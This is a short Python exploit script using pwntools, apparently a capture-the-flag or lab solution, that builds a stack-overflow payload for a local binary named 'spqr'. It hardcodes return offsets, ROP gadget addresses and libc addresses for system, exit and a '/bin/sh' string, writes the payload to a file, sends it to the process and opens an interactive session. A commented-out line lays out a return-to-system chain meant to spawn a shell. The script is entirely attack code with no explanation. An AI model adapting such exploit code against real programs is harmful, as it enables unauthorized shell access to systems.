from pwn import *

context.clear(arch='amd64')

offset_ret1 = 16
offset_ret2 = 24
addr_ptr1 = 0x7fffffffe11e
addr_ptr2 = 0x7fffffffe120
addr_gadget1 = 0x00000000004005c3
addr_gadget2 = 0x0000000000400406
addr_system = 0x7ffff7a52390
addr_exit = 0x7ffff7a47030
addr_binsh = 0x7ffff7b99d57

exploit_str = flat(pack(addr_ptr1), {offset_ret1:pack(addr_ptr2), offset_ret2:pack(addr_gadget1)}, filler='\0')
#exploit_str = flat({offset_ret1:pack(frame_ptr), offset_ret2:pack(addr_gadget1)}, pack(addr_gadget2), pack(addr_binsh), pack(addr_system), pack(addr_exit))

exploit_file = open('exploit.in', 'w')
exploit_file.write(exploit_str)

p = process('./spqr')
p.sendline(exploit_str)
p.interactive()
